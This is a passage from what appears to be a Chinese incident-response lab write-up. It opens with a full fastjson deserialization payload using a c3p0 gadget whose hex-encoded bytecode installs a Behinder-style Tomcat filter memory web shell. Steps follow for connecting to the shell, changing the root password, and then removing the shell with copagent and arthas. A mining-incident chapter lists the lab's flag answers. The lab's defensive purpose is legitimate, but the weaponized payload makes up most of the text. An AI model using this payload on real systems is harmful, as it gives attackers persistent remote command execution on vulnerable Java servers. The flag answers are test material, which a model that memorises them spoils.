{  "a":{    "\u0040\u0074\u0079\u0070\u0065":"java.lang.Class",    "val":"com.mchange.v2.c3p0.WrapperConnectionPoolDataSource"  },  "b":{    "\u0040\u0074\u0079\u0070\u0065":"com.mchange.v2.c3p0.WrapperConnectionPoolDataSource",    "\u0075\u0073\u0065\u0072\u004f\u0076\u0065\u0072\u0072\u0069\u0064\u0065\u0073\u0041\u0073\u0053\u0074\u0072\u0069\u006e\u0067":"HexAsciiSerializedMap:aced0005737200116a6176612e7574696c2e486173684d61700507dac1c31660d103000246000a6c6f6164466163746f724900097468726573686f6c6478703f4000000000000c770800000010000000017372003a636f6d2e73756e2e6f72672e6170616368652e78616c616e2e696e7465726e616c2e78736c74632e747261782e54656d706c61746573496d706c09574fc16eacab3303000649000d5f696e64656e744e756d62657249000e5f7472616e736c6574496e6465785b000a5f62797465636f6465737400035b5b425b00065f636c6173737400125b4c6a6176612f6c616e672f436c6173733b4c00055f6e616d657400124c6a6176612f6c616e672f537472696e673b4c00115f6f757470757450726f706572746965737400164c6a6176612f7574696c2f50726f706572746965733b787000000000ffffffff757200035b5b424bfd19156767db37020000787000000001757200025b42acf317f8060854e002000078700000254acafebabe0000003401880a005e00cc0800cd09004b00ce0700cf0700d00b000400d10700d20a000700cc08007f0b004900d308007b08007d0a00d400d50a00d400d60b000400d70800d80a00d900da0a002400db0a001c00dc0a001c00dd0800de0a004b00df0b00e000e10a00e200e30800e40a00e500e60800e70700e80700a40900e900ea0a001c00eb0a00ec00ed0800ee0a002700ef0700f00700f10a00e900f20a00ec00f30700f40a001c00f50a00f600ed0a001c00f70a00f600f80800f908009d0b00fa00fb0800fc0a00fd00fe0700ff0a00d901000a003101010a00fd01020701030a003500cc0b000401040a010501060a003501070a00fd01080a001c010908010a07010b08010c07010d0a003f010e0b010f01100701110801120a001c01130800c90a001c01140a011500ed0a011501160701170b004901160701180a004b00cc0701190a004d00cc0a004d011a0a004d011b0a004d011c0a0042011d07011e0a005300cc08011f0a005301200a0053011b09012101220a012101230a005301240a0042012507012607012707012807012901000270610100124c6a6176612f6c616e672f537472696e673b01000d436f6e7374616e7456616c75650100063c696e69743e010003282956010004436f646501000f4c696e654e756d6265725461626c650100124c6f63616c5661726961626c655461626c650100047468697301000a4c4963655368656c6c3b010004696e697401001f284c6a617661782f736572766c65742f46696c746572436f6e6669673b295601000c66696c746572436f6e66696701001c4c6a617661782f736572766c65742f46696c746572436f6e6669673b01000a457863657074696f6e7307012a0100104d6574686f64506172616d6574657273010008646f46696c74657201005b284c6a617661782f736572766c65742f536572766c6574526571756573743b4c6a617661782f736572766c65742f536572766c6574526573706f6e73653b4c6a617661782f736572766c65742f46696c746572436861696e3b29560100064c636c6173730100114c6a6176612f6c616e672f436c6173733b01000e736572766c65745265717565737401001e4c6a617661782f736572766c65742f536572766c6574526571756573743b01000f736572766c6574526573706f6e736501001f4c6a617661782f736572766c65742f536572766c6574526573706f6e73653b01000b66696c746572436861696e01001b4c6a617661782f736572766c65742f46696c746572436861696e3b010007726571756573740100274c6a617661782f736572766c65742f687474702f48747470536572766c6574526571756573743b010008726573706f6e73650100284c6a617661782f736572766c65742f687474702f48747470536572766c6574526573706f6e73653b01000773657373696f6e0100204c6a617661782f736572766c65742f687474702f4874747053657373696f6e3b01000b70616765436f6e7465787401000f4c6a6176612f7574696c2f4d61703b010002636c0100174c6a6176612f6c616e672f436c6173734c6f616465723b0100164c6f63616c5661726961626c65547970655461626c650100354c6a6176612f7574696c2f4d61703c4c6a6176612f6c616e672f537472696e673b4c6a6176612f6c616e672f4f626a6563743b3e3b01000d537461636b4d61705461626c6507011807012b07012c07012d0700cf0700d007012e0701170700f40700e807012f01000764657374726f79010009527573685468657265010081284c6a6176612f6c616e672f436c6173733b4c6a6176612f6c616e672f436c6173734c6f616465723b4c6a617661782f736572766c65742f687474702f4874747053657373696f6e3b4c6a617661782f736572766c65742f687474702f48747470536572766c6574526571756573743b4c6a6176612f7574696c2f4d61703b295601000576617231380100224c6a6176612f6c616e672f436c6173734e6f74466f756e64457863657074696f6e3b010006646566696e6501001a4c6a6176612f6c616e672f7265666c6563742f4d6574686f643b01000675636c61737301000b636f6e7374727563746f7201001f4c6a6176612f6c616e672f7265666c6563742f436f6e7374727563746f723b010001750100124c6a6176612f6c616e672f4f626a6563743b010002556d0100016b010001630100154c6a617661782f63727970746f2f4369706865723b01000b65436c61737342797465730100025b4201000665636c617373010001610100016201000862797465636f64650701300700f007010b0100095369676e61747572650100a7284c6a6176612f6c616e672f436c6173733b4c6a6176612f6c616e672f436c6173734c6f616465723b4c6a617661782f736572766c65742f687474702f4874747053657373696f6e3b4c6a617661782f736572766c65742f687474702f48747470536572766c6574526571756573743b4c6a6176612f7574696c2f4d61703c4c6a6176612f6c616e672f537472696e673b4c6a6176612f6c616e672f4f626a6563743b3e3b29560100097472616e73666f726d010072284c636f6d2f73756e2f6f72672f6170616368652f78616c616e2f696e7465726e616c2f78736c74632f444f4d3b5b4c636f6d2f73756e2f6f72672f6170616368652f786d6c2f696e7465726e616c2f73657269616c697a65722f53657269616c697a6174696f6e48616e646c65723b2956010008646f63756d656e7401002d4c636f6d2f73756e2f6f72672f6170616368652f78616c616e2f696e7465726e616c2f78736c74632f444f4d3b01000868616e646c6572730100425b4c636f6d2f73756e2f6f72672f6170616368652f786d6c2f696e7465726e616c2f73657269616c697a65722f53657269616c697a6174696f6e48616e646c65723b0701310100a6284c636f6d2f73756e2f6f72672f6170616368652f78616c616e2f696e7465726e616c2f78736c74632f444f4d3b4c636f6d2f73756e2f6f72672f6170616368652f786d6c2f696e7465726e616c2f64746d2f44544d417869734974657261746f723b4c636f6d2f73756e2f6f72672f6170616368652f786d6c2f696e7465726e616c2f73657269616c697a65722f53657269616c697a6174696f6e48616e646c65723b29560100086974657261746f720100354c636f6d2f73756e2f6f72672f6170616368652f786d6c2f696e7465726e616c2f64746d2f44544d417869734974657261746f723b01000768616e646c65720100414c636f6d2f73756e2f6f72672f6170616368652f786d6c2f696e7465726e616c2f73657269616c697a65722f53657269616c697a6174696f6e48616e646c65723b0100083c636c696e69743e01000666696c7465720100164c6a617661782f736572766c65742f46696c7465723b01000966696c7465724465660100314c6f72672f6170616368652f746f6d6361742f7574696c2f64657363726970746f722f7765622f46696c7465724465663b01000966696c7465724d61700100314c6f72672f6170616368652f746f6d6361742f7574696c2f64657363726970746f722f7765622f46696c7465724d61703b0100324c6f72672f6170616368652f636174616c696e612f636f72652f4170706c69636174696f6e46696c746572436f6e6669673b0100046e616d65010015776562617070436c6173734c6f61646572426173650100324c6f72672f6170616368652f636174616c696e612f6c6f616465722f576562617070436c6173734c6f61646572426173653b01000f7374616e64617264436f6e7465787401002a4c6f72672f6170616368652f636174616c696e612f636f72652f5374616e64617264436f6e746578743b010007436f6e666967730100194c6a6176612f6c616e672f7265666c6563742f4669656c643b01000d66696c746572436f6e6669677301000a536f7572636546696c6501000d4963655368656c6c2e6a6176610c00630064010010336164326664646665386261643865360c006000610100256a617661782f736572766c65742f687474702f48747470536572766c6574526571756573740100266a617661782f736572766c65742f687474702f48747470536572766c6574526573706f6e73650c013201330100116a6176612f7574696c2f486173684d61700c013401350701360c013701380c0139013a0c013b013c010004504f535407013d0c010a013e0c013f01400c014101400c0142013c0100156a6176612e6c616e672e436c6173734c6f616465720c0094009507012d0c007101430701440c0145014801026479763636766741414144514147676f41424141554367414541425548414259484142634241415938615735706444344241426f6f54477068646d4576624746755a7939446247467a633078765957526c636a73705667454142454e765a4755424141394d6157356c546e5674596d5679564746696247554241424a4d62324e6862465a68636d6c68596d786c56474669624755424141523061476c7a415141445446553741514142597745414630787159585a684c327868626d63765132786863334e4d6232466b5a584937415141425a7745414653686251696c4d616d4632595339735957356e4c304e7359584e7a4f7745414157494241414a6251674541436c4e7664584a6a5a555a706247554241415a564c6d7068646d454d41415541426777414741415a415141425651454146577068646d4576624746755a7939446247467a633078765957526c636745414332526c5a6d6c755a554e7359584e7a415141584b46744353556b7054477068646d4576624746755a7939446247467a637a734149514144414151414141414141414941414141464141594141514148414141414f67414341414941414141474b6975334141477841414141416741494141414142674142414141414167414a4141414146674143414141414267414b4141734141414141414159414441414e414145414151414f41413841415141484141414150514145414149414141414a4b6973444b37363341414b7741414141416741494141414142674142414141414177414a4141414146674143414141414351414b414173414141414141416b4145414152414145414151415341414141416741540701490c014a014b01000b646566696e65436c61737301000f6a6176612f6c616e672f436c61737307014c0c014d00740c014e014f0701300c01500151010001550c015201530100206a6176612f6c616e672f436c6173734e6f74466f756e64457863657074696f6e0100106a6176612f6c616e672f4f626a6563740c015401550c015601570100156a6176612f6c616e672f436c6173734c6f616465720c0158015907015a0c015b013a0c015c015d0100016707012e0c015e015f0100034145530701600c0161016201001f6a617661782f63727970746f2f737065632f5365637265744b6579537065630c016301640c006301650c006a016601001673756e2f6d6973632f4241534536344465636f6465720c016701680701690c016a013c0c016b014b0c016c016d0c015c016e010006657175616c730100136a6176612f6c616e672f457863657074696f6e01000c4175746f6d6e6547726565740100306f72672f6170616368652f636174616c696e612f6c6f616465722f576562617070436c6173734c6f61646572426173650c016f01700701710c017201730100286f72672f6170616368652f636174616c696e612f636f72652f5374616e64617264436f6e746578740100286f72672e6170616368652e636174616c696e612e636f72652e5374616e64617264436f6e746578740c017401530c017501760701770c0178017901000d6a6176612f7574696c2f4d61700100084963655368656c6c01002f6f72672f6170616368652f746f6d6361742f7574696c2f64657363726970746f722f7765622f46696c7465724465660c017a017b0c017c017d0c017e017d0c017f018001002f6f72672f6170616368652f746f6d6361742f7574696c2f64657363726970746f722f7765622f46696c7465724d61700100062f7368656c6c0c0181017d0701820c018301840c00c2013c0c0185017d0c018601870100306f72672f6170616368652f636174616c696e612f636f72652f4170706c69636174696f6e46696c746572436f6e66696701001b6f72672f6170616368652f636174616c696e612f436f6e74657874010040636f6d2f73756e2f6f72672f6170616368652f78616c616e2f696e7465726e616c2f78736c74632f72756e74696d652f41627374726163745472616e736c65740100146a617661782f736572766c65742f46696c74657201001e6a617661782f736572766c65742f536572766c6574457863657074696f6e01001c6a617661782f736572766c65742f536572766c65745265717565737401001d6a617661782f736572766c65742f536572766c6574526573706f6e73650100196a617661782f736572766c65742f46696c746572436861696e01001e6a617661782f736572766c65742f687474702f4874747053657373696f6e0100136a6176612f696f2f494f457863657074696f6e0100186a6176612f6c616e672f7265666c6563742f4d6574686f64010039636f6d2f73756e2f6f72672f6170616368652f78616c616e2f696e7465726e616c2f78736c74632f5472616e736c6574457863657074696f6e01000a67657453657373696f6e01002228294c6a617661782f736572766c65742f687474702f4874747053657373696f6e3b010003707574010038284c6a6176612f6c616e672f4f626a6563743b4c6a6176612f6c616e672f4f626a6563743b294c6a6176612f6c616e672f4f626a6563743b0100106a6176612f6c616e672f54687265616401000d63757272656e7454687265616401001428294c6a6176612f6c616e672f5468726561643b010015676574436f6e74657874436c6173734c6f6164657201001928294c6a6176612f6c616e672f436c6173734c6f616465723b0100096765744d6574686f6401001428294c6a6176612f6c616e672f537472696e673b0100106a6176612f6c616e672f537472696e67010015284c6a6176612f6c616e672f4f626a6563743b295a010008676574436c61737301001328294c6a6176612f6c616e672f436c6173733b01000d6765745375706572636c6173730100076765744e616d65010040284c6a617661782f736572766c65742f536572766c6574526571756573743b4c6a617661782f736572766c65742f536572766c6574526573706f6e73653b29560100106a6176612f7574696c2f42617365363401000a6765744465636f6465720100074465636f64657201000c496e6e6572436c617373657301001c28294c6a6176612f7574696c2f426173653634244465636f6465723b0100186a6176612f7574696c2f426173653634244465636f6465720100066465636f6465010016284c6a6176612f6c616e672f537472696e673b295b420100116a6176612f6c616e672f496e7465676572010004545950450100116765744465636c617265644d6574686f64010040284c6a6176612f6c616e672f537472696e673b5b4c6a6176612f6c616e672f436c6173733b294c6a6176612f6c616e672f7265666c6563742f4d6574686f643b01000d73657441636365737369626c65010004285a29560100096c6f6164436c617373010025284c6a6176612f6c616e672f537472696e673b294c6a6176612f6c616e672f436c6173733b01000776616c75654f660100162849294c6a6176612f6c616e672f496e74656765723b010006696e766f6b65010039284c6a6176612f6c616e672f4f626a6563743b5b4c6a6176612f6c616e672f4f626a6563743b294c6a6176612f6c616e672f4f626a6563743b0100166765744465636c61726564436f6e7374727563746f72010033285b4c6a6176612f6c616e672f436c6173733b294c6a6176612f6c616e672f7265666c6563742f436f6e7374727563746f723b01001d6a6176612f6c616e672f7265666c6563742f436f6e7374727563746f7201000e676574436c6173734c6f6164657201000b6e6577496e7374616e6365010027285b4c6a6176612f6c616e672f4f626a6563743b294c6a6176612f6c616e672f4f626a6563743b01000c736574417474726962757465010027284c6a6176612f6c616e672f537472696e673b4c6a6176612f6c616e672f4f626a6563743b29560100136a617661782f63727970746f2f43697068657201000b676574496e7374616e6365010029284c6a6176612f6c616e672f537472696e673b294c6a617661782f63727970746f2f4369706865723b010008676574427974657301000428295b42010017285b424c6a6176612f6c616e672f537472696e673b295601001728494c6a6176612f73656375726974792f4b65793b295601000967657452656164657201001a28294c6a6176612f696f2f42756666657265645265616465723b0100166a6176612f696f2f4275666665726564526561646572010008726561644c696e6501000c6465636f6465427566666572010007646f46696e616c010006285b42295b4201001428294c6a6176612f6c616e672f4f626a6563743b01000c6765745265736f757263657301002728294c6f72672f6170616368652f636174616c696e612f5765625265736f75726365526f6f743b0100236f72672f6170616368652f636174616c696e612f5765625265736f75726365526f6f7401000a676574436f6e7465787401001f28294c6f72672f6170616368652f636174616c696e612f436f6e746578743b010007666f724e616d650100106765744465636c617265644669656c6401002d284c6a6176612f6c616e672f537472696e673b294c6a6176612f6c616e672f7265666c6563742f4669656c643b0100176a6176612f6c616e672f7265666c6563742f4669656c64010003676574010026284c6a6176612f6c616e672f4f626a6563743b294c6a6176612f6c616e672f4f626a6563743b01000973657446696c746572010019284c6a617661782f736572766c65742f46696c7465723b295601000d73657446696c7465724e616d65010015284c6a6176612f6c616e672f537472696e673b295601000e73657446696c746572436c61737301000c61646446696c746572446566010034284c6f72672f6170616368652f746f6d6361742f7574696c2f64657363726970746f722f7765622f46696c7465724465663b295601000d61646455524c5061747465726e01001c6a617661782f736572766c65742f44697370617463686572547970650100075245515545535401001e4c6a617661782f736572766c65742f44697370617463686572547970653b01000d7365744469737061746368657201001261646446696c7465724d61704265666f7265010034284c6f72672f6170616368652f746f6d6361742f7574696c2f64657363726970746f722f7765622f46696c7465724d61703b29560021004b005e0001005f0001001200600061000100620000000200020008000100630064000100650000003d000200010000000b2ab700012a1202b50003b10000000200660000000e00030000002900040027000a002a00670000000c00010000000b0068006900000001006a006b00030065000000350000000200000001b10000000200660000000600010000002d00670000001600020000000100680069000000000001006c006d0001006e000000040001006f00700000000501006c000000010071007200030065000003180006000a000001ab2bc000043a042cc000053a051904b9000601003a06bb000759b700083a07190712091906b9000a0300571907120b1904b9000a0300571907120c1905b9000a030057b8000db6000e3a081904b9000f01001210b600119901541908b60012b60013b600141215b6001199001e1908b60012b600133a092a19091908190619041907b60016a7011e1908b60012b60013b60013b600141215b600119900211908b60012b60013b600133a092a19091908190619041907b60016a700ea1908b60012b60013b60013b60013b600141215b600119900241908b60012b60013b60013b600133a092a19091908190619041907b60016a700b01908b60012b60013b60013b60013b60013b600141215b600119900271908b60012b60013b60013b60013b600133a092a19091908190619041907b60016a700701908b60012b60013b60013b60013b60013b60013b600141215b6001199002a1908b60012b60013b60013b60013b60013b600133a092a19091908190619041907b60016a7002a1908b60012b60013b60013b60013b60013b60013b600133a092a19091908190619041907b600162d2b2cb900170300b100000004006600000072001c0000003000060031000c003200150033001e0034002a00350036003600420037004a00380059003a006c003b0076003c0087003d009d003e00aa003f00bb004000d4004100e4004200f5004301110044012400450135004601540047016a0048017b004a0194004b01a2004e01aa0051006700000098000f0076001100730074000900aa001100730074000900e4001100730074000901240011007300740009016a001100730074000901940016007300740009000001ab006800690000000001ab007500760001000001ab007700780002000001ab0079007a0003000601a5007b007c0004000c019f007d007e000500150196007f00800006001e018d008100820007004a016100830084000800850000000c0001001e018d0081008600070087000000330007ff0087000907008807008907008a07008b07008c07008d07008e07008f070090000033393ffb0045fc0026070091fa0007006e0000000600020092006f00700000000d03007500000077000000790000000100930064000100650000002b0000000100000001b10000000200660000000600010000005400670000000c00010000000100680069000000010094009500030065000002e50006001200000133b800181219b6001a3a062b121b06bd001c5903121d535904b2001e535905b2001e53b6001f3a07190704b60020013a082c1221b600223a08a700293a0919072c06bd00245903190653590403b800255359051906beb8002553b60026c0001c3a08190804bd001c5903122753b600283a09190904b60029190904bd002459032ab60012b6002a53b6002b3a0a1908122c04bd001c5903121d53b6001f3a0b190b04b6002012023a0c2d122d190cb9002e0300122fb800303a0d190d05bb003159190cb60032122fb70033b60034190dbb003559b700361904b900370100b60038b60039b6003a3a0e190b190a04bd00245903190e53b60026c0001c3a0f190fb6003b3a10190f123c04bd001c5903122453b6001f3a11191104b600201911191004bd00245903190553b6002657a700053a07b1000200300038003b0023000a012d0130003d000400660000006a001a00000057000a005a0027005b002d005c0030005f00380062003b0060003d0061006100640071006500770066008c0067009e006800a4006900a8006a00b2006b00b9006c00cd006d00e8006e00fd006f0104007001160071011c0072012d007401300073013200750067000000c00013003d002400960097000900270106009800990007003000fd009a00740008007100bc009b009c0009008c00a1009d009e000a009e008f009f0099000b00a8008500a00061000c00b9007400a100a2000d00e8004500a300a4000e00fd003000a50074000f0104002900a6009e00100116001700a70099001100000133006800690000000001330073007400010000013300830084000200000133007f0080000300000133007b007c000400000133008100820005000a012900a800a4000600850000000c0001000001330081008600050087000000480004ff003b000907008807009107009007008e07008c07008f07001d0700a907009100010700aa25ff00ce000707008807009107009007008e07008c07008f07001d00010700ab01007000000015050073000000830000007f0000007b00000081000000ac0000000200ad000100ae00af000300650000003f0000000300000001b1000000020066000000060001000000780067000000200003000000010068006900000000000100b000b100010000000100b200b30002006e00000004000100b40070000000090200b0000000b20000000100ae00b500030065000000490000000400000001b10000000200660000000600010000007b00670000002a0004000000010068006900000000000100b000b100010000000100b600b700020000000100b800b90003006e00000004000100b400700000000d0300b0000000b6000000b80000000800ba006400010065000001da0005000a000000de123e4bb8000db6000ec0003f4c2bb60040b900410100c000424d1243b800441245b600464e2d04b600472d2cb60048c000493a041904123eb9004a0200c7009cbb004b59b7004c3a05bb004d59b7004e3a0619061905b6004f1906123eb6005019061905b60012b60014b600512c1906b60052bb005359b700543a0719071255b600561907123eb600571907b20058b60059b6005a2c1907b6005b125c05bd001c5903125d535904124d53b600283a08190804b60029190805bd002459032c535904190653b6002bc0005c3a091904123e1909b9000a030057a700044bb10001000000d900dc003d000300660000006600190000007f00030080000d0081001a008200250083002a008400340085004000860049008700520088005900890060008a006d008b0073008c007c008d0083008e008a008f00950090009b009100b0009200b6009300cd009400d9009700dc009600dd0099006700000066000a0049009000bb00bc00050052008700bd00be0006007c005d00bf00c0000700b00029009b009c000800cd000c006c00c10009000300d600c200610000000d00cc00c300c40001001a00bf00c500c60002002500b400c700c80003003400a500c90082000400870000000a0003fb00d9420700ab00000200ca0000000200cb01470000000a000100e500e201460009707400013170770100787372002e6a617661782e6d616e6167656d656e742e42616441747472696275746556616c7565457870457863657074696f6ed4e7daab632d46400200014c000376616c7400124c6a6176612f6c616e672f4f626a6563743b787200136a6176612e6c616e672e457863657074696f6ed0fd1f3e1a3b1cc4020000787200136a6176612e6c616e672e5468726f7761626c65d5c635273977b8cb0300044c000563617573657400154c6a6176612f6c616e672f5468726f7761626c653b4c000d64657461696c4d65737361676571007e00055b000a737461636b547261636574001e5b4c6a6176612f6c616e672f537461636b5472616365456c656d656e743b4c001473757070726573736564457863657074696f6e737400104c6a6176612f7574696c2f4c6973743b787071007e0014707572001e5b4c6a6176612e6c616e672e537461636b5472616365456c656d656e743b02462a3c3cfd22390200007870000000027372001b6a6176612e6c616e672e537461636b5472616365456c656d656e746109c59a2636dd8502000449000a6c696e654e756d6265724c000e6465636c6172696e67436c61737371007e00054c000866696c654e616d6571007e00054c000a6d6574686f644e616d6571007e000578700000002774000454657374740009546573742e6a61766174000367656e7371007e00170000000f71007e001971007e001a7400046d61696e737200266a6176612e7574696c2e436f6c6c656374696f6e7324556e6d6f6469666961626c654c697374fc0f2531b5ec8e100200014c00046c69737471007e00137872002c6a6176612e7574696c2e436f6c6c656374696f6e7324556e6d6f6469666961626c65436f6c6c656374696f6e19420080cb5ef71e0200014c0001637400164c6a6176612f7574696c2f436f6c6c656374696f6e3b7870737200136a6176612e7574696c2e41727261794c6973747881d21d99c7619d03000149000473697a657870000000007704000000007871007e0023787372001e636f6d2e616c69626162612e666173746a736f6e2e4a534f4e417272617900000000000000010200014c00046c69737471007e001378707371007e00220000000177040000000171007e00077878;",    }}

```

![image-20240530112825526](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530112825526.png?imageSlim)

![image-20240530111702810](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530111702810.png?imageSlim)

成功连接
![image-20240530113025712](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530113025712.png?imageSlim)

直接冰蝎命令执行查看内核版本

![image-20240530113156554](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530113156554.png?imageSlim)

3.清理内存马 （热清理）

[LandGrey/copagent: java memory web shell extracting tool (github.com)](https://github.com/LandGrey/copagent)

用冰蝎修改root密码然后ssh连过去

![image-20240530115246468](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530115246468.png?imageSlim)

上传cop.jar，使用cop.jar将java内存拷贝出来并打包

![image-20240530115533869](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530115533869.png?imageSlim)

使用d盾自动找到内存马文件

![image-20240530115719207](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530115719207.png?imageSlim)

修改可疑文件中的冰蝎密钥，并重新编译

![image-20240530115937029](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530115937029.png?imageSlim)

也可以修改其他地方，确保文件无法利用或无危害即可

![image-20240603161154913](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240603161154913.png?imageSlim)

上传编译后的文件IceShell.class，使用arthas热更新该文件。若未配置java环境变量，使用find / -name java 找到java路径即可。

![image-20240603161716251](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240603161716251.png?imageSlim)

用之前的密钥冰蝎连接失败，用修改后的密钥冰蝎连接成功。

4.清理后门 （热清理）

清除ssh公钥

![image-20240603161758032](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240603161758032.png?imageSlim)

## 第九章-kswapd0挖矿

1.通过本地 PC SSH到服务器并且分析黑客的 IP 为多少,将黑客 IP 作为 FLAG 提交;

```
flag{182.164.3.252}
```

查看auth.log日志文件

`cat /var/log/auth.log.1`

![image-20240530170214406](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530170214406.png?imageSlim)

2.通过本地 PC SSH到服务器并且分析黑客的用户名为什么,将黑客的用户名作为 FLAG 提交;

```
flag{mdrfckr}
```

`cat /root/.ssh/authorized_keys`

![image-20240530170353553](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530170353553.png?imageSlim)

3.通过本地 PC SSH到服务器并且分析黑客权限维持文件的md5,将文件的 MD5(md5sum /file) 作为 FLAG 提交;

```
flag{45437b4e86fba2ab890ac81db2ec3606}
```

![image-20240530170756196](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530170756196.png?imageSlim)

文件路径为`/var/spool/cron/crontabs/root`
